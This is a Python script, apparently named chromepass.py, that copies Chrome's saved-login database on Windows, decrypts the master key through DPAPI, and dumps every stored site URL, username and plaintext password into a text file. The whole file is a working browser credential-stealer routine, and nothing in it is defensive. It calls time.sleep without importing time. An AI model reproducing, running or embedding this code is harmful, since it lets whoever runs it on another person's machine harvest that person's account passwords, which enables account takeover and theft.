import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
from datetime import timezone, datetime, timedelta

def main():
	count = 0
	# get the AES key
	key = get_encryption_key()
	# local sqlite Chrome database path
	db_path = os.path.join(os.environ["USERPROFILE"], "AppData",
		"Local", "Google", "Chrome", "User Data",
		"default", "Login Data")
	# copy the file to another location
	# as the database will be locked if chrome is currently running
	filename = "ChromeData.db"
	shutil.copyfile(db_path, filename)
	# connect to the database
	db = sqlite3.connect(filename)
	cursor = db.cursor()
	# 'logins' table has the data we need
	cursor.execute("""select origin_url, action_url, username_value, 
		password_value, date_created, date_last_used 
		from logins 
		order by date_created""")

	# print the texts at the beginning of the file named "login_data.txt"
	sourceFile = open("login_data.txt", 'a')
	print("This is a text file containing all the login credentials that you "
		"stored in your Google Account via Chrome", file=sourceFile)
	print("-|-"* 36, file=sourceFile)
	print(file=sourceFile)

	# iterate over all rows
	for row in cursor.fetchall():
		origin_url = row[0]
		action_url = row[1]
		username = row[2]
		password = decrypt_password(row[3], key)
		date_created = row[4]
		date_last_used = row[5]
		count += 1

		# stores the results in a txt file named "login_data.txt"
		sourceFile = open("login_data.txt", 'a')
		if username or password:
			print(f"Origin URL: {origin_url}", file=sourceFile)
			# print(f"Action URL: {action_url}", file=sourceFile)
			print(f"Username: {username}", file=sourceFile)
			print(f"Password: {password}", file=sourceFile)
		else:
			continue
		if date_created !=  86400000000 and date_created:
			print(f"Creation date: {str(get_chrome_datetime(date_created))}", file=sourceFile)
		if date_last_used != 86400000000 and date_last_used:
			print(f"Last Used: {str(get_chrome_datetime(date_last_used))}", file=sourceFile)
		# print a total of 70 '=' at the end of each iteration
		print("="*70, file=sourceFile)
		
	# print the total number of accounts recovered after all iterations
	sourceFile = open("login_data.txt", 'a')
	print(f"\nA total of {count} account details were retrived.", file=sourceFile)
	print(f"\nLove from Buchii :)", file=sourceFile)
	print("Successfully excuted!")
	time.sleep(2)
	print("`login_data.txt` has been added to your file directory")

	cursor.close()
	db.close()
	try:
		# try to remove the copied db file
		os.remove(filename)
	except:
		pass

def get_chrome_datetime(chromedate):
	"""Return a 'datetime.datime' object from a chrome format datetime
	Since 'chromedate' is formatted as the number of microseconds since
	January, 1601
	"""
	return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

def get_encryption_key():
	local_state_path = os.path.join(os.environ["USERPROFILE"],
		"AppData", "Local", "Google", "Chrome",
		"User Data", "Local State")
	with open(local_state_path, "r", encoding="utf-8") as f:
		local_state = f.read()
		local_state = json.loads(local_state)

	# decode the encrpytion key from Base64
	key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
	# remove DPAPI str
	key = key[5:]
	# return decrpyted key that was originally encrypted
	# using a session key derived from current user's login credentials
	# doc: https://timgolden.me.uk/pywin32-docs/win32crypt.html
	return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(password, key):
	try:
		# get the initialization vector
		iv = password[3:15]
		password = password[15:]
		# generate cipher
		cipher = AES.new(key, AES.MODE_GCM, iv)
		# decrpyt password
		return cipher.decrypt(password)[:-16].decode()
	except:
		try:
			return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
		except:
			# not supported
			return ""

# If this file was executed like this:
# > chromepass.py
# then call the main function. However, if this file
# was simply imported, then skip the call to main.
if __name__ == '__main__':
	main()
